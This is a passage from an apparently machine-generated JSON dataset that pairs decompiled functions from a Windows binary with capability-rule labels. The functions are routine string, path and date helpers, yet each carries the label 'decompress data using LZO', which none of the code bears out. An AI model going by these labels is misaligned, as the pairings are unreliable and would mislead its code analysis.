        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407308)\n\nvoid fcn.004072bc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint arg_8h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x407368;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.0040546c();\n    bVar3 = true;\n    arg_8h = 0x4072ed;\n    fcn.00405df4();\n    if (!bVar3) {\n        fcn.00405de8();\n        fcn.00405b8c();\n        arg_8h = fcn.00405de8();\n        uVar1 = fcn.00405dd8();\n        fcn.004058fc(uVar1);\n        iVar2 = fcn.004070b0(arg_8h);\n        if (iVar2 < 1) {\n            fcn.0040546c();\n        }\n        else {\n            fcn.00405b8c();\n        }\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack28 = 0x40736f;\n    uStack32 = 0x407367;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 351
    },
    "00407378": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00407378(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x407423;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = 0x4073a0;\n    fcn.00405c48();\n    if (in_EAX != 0) {\n        fcn.00405ec4();\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        iVar2 = fcn.00405de8();\n        uVar1 = fcn.004058fc(iVar2 + 1);\n        fcn.00405dd8(uVar1);\n        iVar2 = fcn.0040718c(in_EAX);\n        if (iVar2 < 1) {\n            fcn.00405c48();\n            iVar2 = in_EAX;\n        }\n        else {\n            fcn.00405ec4();\n            iVar2 = in_EAX;\n        }\n        fcn.00405c84();\n    }\n    *in_FS_OFFSET = iVar2;\n    uStack32 = 0x40742a;\n    iStack36 = 0x407422;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 357
    },
    "004096d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004096d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405b8c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 - piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 - piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 484
    },
    "00409760": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00409760(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405b8c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 + piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 + piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 491
    },
    "004099a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004099a4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004058fc();\n    fcn.0040555c();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "004099dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004099dc(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004058fc();\n    fcn.0040555c();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharLowerBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409a14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409a14(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004058fc(param_2);\n    uVar1 = fcn.004058fc(in_EAX, uVar1);\n    iVar2 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    return iVar2 + -2;\n}\n",
        "token_count": 169
    },
    "00409a78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409a78(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    for (iVar1 = 1; (iVar1 <= iVar2 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + 1) {\n    }\n    if (iVar2 < iVar1) {\n        fcn.0040546c();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar2) < 0x21; iVar2 = iVar2 + -1) {\n        }\n        fcn.00405964(param_2);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00409b1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b1c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405964(param_2);\n    return;\n}\n",
        "token_count": 125
    },
    "00409b54": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409b54(uint param_1, char param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    uVar4 = 0;\n    pcVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar5 = *(in_EAX + -4);\n    }\n    if (pcVar5 == NULL) {\n        bVar2 = true;\n    }\n    else {\n        cVar1 = *in_EAX;\n        if (((cVar1 + 0xbfU < 0x1a) || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        bVar2 = uVar3 ^ 1;\n    }\n    if (!bVar2) {\n        if (param_2 == '\\0') {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        else {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((cVar1 != '.') && (9 < cVar1 - 0x30U)) &&\n                       ((0x19 < cVar1 + 0xbfU && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 630
    },
    "00409cc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409cc0(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "00409efc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00409efc(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    if (-1 < in_EDX) {\n        var_ch = in_EDX + 1;\n        do {\n            iVar2 = *(arg_8h + -4);\n            iVar3 = *in_EAX;\n            if (iVar2 != 0) {\n                iVar2 = *(iVar2 + -4);\n            }\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar1 = fcn.004058fc(iVar3);\n            fcn.004058fc(iVar2, uVar1);\n            iVar2 = sub.kernel32.dll_CompareStringA_1();\n            if (iVar2 == 2) {\n                return 1;\n            }\n            in_EAX = in_EAX + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "0040a1b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a1b0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    char cVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x40a1c5;\n    fcn.004058ec();\n    uStack32 = 0x40a299;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (in_EAX == 0) {\n        puStack28 = &stack0xfffffffc;\n        iVar1 = fcn.0040dab4();\n        *(iVar1 + 0xc) = 3;\n        fcn.00404eb4();\n    }\n    fcn.0040e778();\n    fcn.00405504();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (in_EAX < 3) {\n        cVar2 = '\\x01';\n    }\n    else {\n        cVar2 = '\\0';\n        fcn.0040a18c();\n    }\n    cVar2 = cVar2 == '\\0';\n    if (cVar2) {\n        fcn.0040a49c();\n        fcn.00405894();\n    }\n    else {\n        cVar2 = '\\x01';\n    }\n    if (cVar2 == '\\0') {\n        fcn.0040a49c();\n        cVar2 = fcn.0040a1b0();\n        if (cVar2 != '\\0') {\n            fcn.0040a748();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40a2a0;\n    uStack32 = 0x40a298;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 464
    },
    "0040a414": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040a414(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040e400(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 136
    },
    "0040a448": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a448(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_2;\n    if (param_2 != 0) {\n        iVar3 = *(param_2 + -4);\n    }\n    fcn.004058fc();\n    do {\n        if (iVar3 < 1) {\n            return iVar3;\n        }\n        if ((*(param_2 + -1 + iVar3) != '\\0') && (iVar2 = fcn.0040a93c(),  iVar2 != 0)) {\n            cVar1 = fcn.0040e400();\n            if (cVar1 != '\\x02') {\n                return iVar3;\n            }\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = iVar3 + -1;\n    } while( true );\n}\n",
        "token_count": 209
    },
    "0040a4d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a4d0(uint param_1, uint param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    if (pcVar1 < 2) {\n        bVar5 = false;\n    }\n    else {\n        bVar5 = in_EAX[1] == ':';\n    }\n    if (bVar5) {\n        fcn.00405964(param_2);\n    }\n    else {\n        pcVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            pcVar1 = *(in_EAX + -4);\n        }\n        if (pcVar1 < 2) {\n            bVar5 = false;\n        }\n        else {\n            bVar5 = *in_EAX == '\\\\';\n        }\n        if (bVar5) {\n            bVar5 = in_EAX[1] == '\\\\';\n        }\n        else {\n            bVar5 = false;\n        }\n        if (bVar5) {\n            iVar3 = 0;\n            iVar4 = 3;\n            while ((iVar2 = fcn.0040572c(),  iVar4 < iVar2 && (iVar3 < 2))) {\n                if (in_EAX[iVar4 + -1] == '\\\\') {\n                    iVar3 = iVar3 + 1;\n                }\n                if (iVar3 < 2) {\n                    iVar4 = iVar4 + 1;\n                }\n            }\n            fcn.00405964(param_2);\n        }\n        else {\n            fcn.0040546c();\n        }\n    }\n    return;\n}\n",
        "token_count": 406
    },
    "0040a824": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a824(void)\n\n{\n    fcn.004058fc();\n    fcn.0040a7f0();\n    return;\n}\n",
        "token_count": 35
    },
    "0040a86c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a86c(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    param_2 = param_2 - in_EAX;\n    if (param_2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uVar1 = in_EAX[param_2];\n        uVar3 = uVar1;\n        puVar2 = in_EAX;\n        if ((uVar1 != *in_EAX) || (uVar1 == 0)) break;\n        uVar1 = in_EAX[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[1]) || (uVar1 == 0)) goto code_r0x0040a8ee;\n        uVar1 = in_EAX[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[2]) || (uVar1 == 0)) goto code_r0x0040a8eb;\n        uVar1 = in_EAX[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[3]) goto code_r0x0040a8e8;\n        puVar2 = in_EAX + 4;\n        if (uVar1 == 0) goto code_r0x0040a8e5;\n        uVar1 = puVar2[param_2];\n        uVar3 = uVar1;\n        if ((uVar1 != *puVar2) || (uVar1 == 0)) break;\n        uVar1 = puVar2[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[5]) || (uVar1 == 0)) goto code_r0x0040a8ee;\n        uVar1 = puVar2[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[6]) || (uVar1 == 0)) goto code_r0x0040a8eb;\n        uVar1 = puVar2[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[7]) goto code_r0x0040a8e8;\n        in_EAX = in_EAX + 8;\n        puVar2 = in_EAX;\n        if (uVar1 == 0) goto code_r0x0040a8e5;\n    }\ncode_r0x0040a8f1:\n    return *puVar2 - uVar3;\ncode_r0x0040a8e5:\n    puVar2 = puVar2 + -4;\ncode_r0x0040a8e8:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a8eb:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a8ee:\n    puVar2 = puVar2 + 1;\n    goto code_r0x0040a8f1;\n}\n",
        "token_count": 727
    },
    "0040a9cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040a9cc(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 39
    },
    "0040aa04": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040aa04(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402f0c();\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "0040aea8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aea8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t arg_10h;\n    uint var_100ch;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EDX;\n    if (in_EDX != 0) {\n        iVar1 = *(in_EDX + -4);\n    }\n    if (iVar1 < 0xc00) {\n        iVar1 = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n        }\n        var_ch = fcn.0040aa9c(arg_8h, in_ECX, iVar1);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar1 = in_EDX;\n        var_ch = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n            var_ch = iVar1;\n        }\n    }\n    if (var_ch < iVar1 + -1) {\n        fcn.0040555c();\n    }\n    else {\n        while (iVar1 + -1 <= var_ch) {\n            iVar1 = iVar1 * 2;\n            fcn.0040546c();\n            fcn.00405b8c();\n            arg_10h = in_EDX;\n            if (in_EDX != 0) {\n                arg_10h = *(in_EDX + -4);\n            }\n            var_ch = fcn.0040aa9c(arg_8h, in_ECX, arg_10h);\n        }\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "0040bc9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc9c(uint arg_8h)\n\n{\n    fcn.0040bc58(arg_8h);\n    return;\n}\n",
        "token_count": 36
    },
    "0040bda8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bda8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack304 = 0x40bf0a;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.0040546c();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.00405504();\n    uVar1 = fcn.004058fc(&fcn.0040bda8::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040bda8::var_14h, uVar1);\n    uStackY336 = 0x40be2b;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40be45;\n        fcn.004056dc();\n        if (in_EAX == 1) {\n            if (*0x4a88cc == 4) {\n                if (*0x4a88d0 == 1) {\n                    uStackY336 = 0x40bea5;\n                    iVar2 = fcn.0040e43c();\n                    if (iVar2 == 4) {\n                        fcn.0040e558();\n                        fcn.00405664();\n                        fcn.0040e5dc();\n                        uStackY336 = 0x40bee9;\n                        fcn.0040555c();\n                    }\n                }\n            }\n            else if (*0x4a88cc == 0x11) {\n                fcn.0040e5dc();\n                fcn.00405964();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.0040546c(0x40bf11);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 617
    },
    "0040bf24": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bf24(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x40c012;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.0040546c();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.00405504();\n    }\n    else {\n        fcn.00405504();\n    }\n    uVar1 = fcn.004058fc(&fcn.0040bf24::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040bf24::var_14h, uVar1);\n    ppcStackY332 = 0x40bfb5;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY332 = 0x40bfcb;\n        fcn.004056dc();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00405964();\n            ppcStackY332 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY332;\n    fcn.0040546c(0x40c019);\n    return;\n}\n",
        "token_count": 489
    },
    "0040c908": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c908(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40c9ce;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = 0;\n    puVar1 = &stack0xfffffffc;\n    var_8h = param_2;\n    if (param_1 != 0) {\n        fcn.0040c850();\n        fcn.00405964(&var_14h);\n        var_10h = var_14h;\n        iVar3 = param_1;\n        if (param_1 != 0) {\n            iVar3 = *(param_1 + -4);\n        }\n        iVar4 = var_14h;\n        if (var_14h != 0) {\n            iVar4 = *(var_14h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar4);\n        uVar2 = fcn.004058fc(iVar3, uVar2);\n        in_stack_ffffffb4 = 0x400;\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        puVar1 = puStack40;\n        if (iVar3 == 2) {\n            if (param_1 != 0) {\n                param_1 = *(param_1 + -4);\n            }\n            *var_8h = *var_8h + param_1;\n            var_9h = 1;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.0040546c(0x40c9d5);\n    return;\n}\n",
        "token_count": 520
    },
    "0040c9e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040c9e0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char cStack16;\n    \n    uVar2 = 0;\n    fcn.0040c850();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if ((*param_2 <= iVar1) && (cStack16 = param_1,  *(in_EAX + -1 + *param_2) == cStack16)) {\n        *param_2 = *param_2 + 1;\n        uVar2 = 1;\n    }\n    return CONCAT44(param_1, uVar2);\n}\n",
        "token_count": 182
    },
    "0040d0a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d0a4(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cb60();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 135
    },
    "0040d0dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
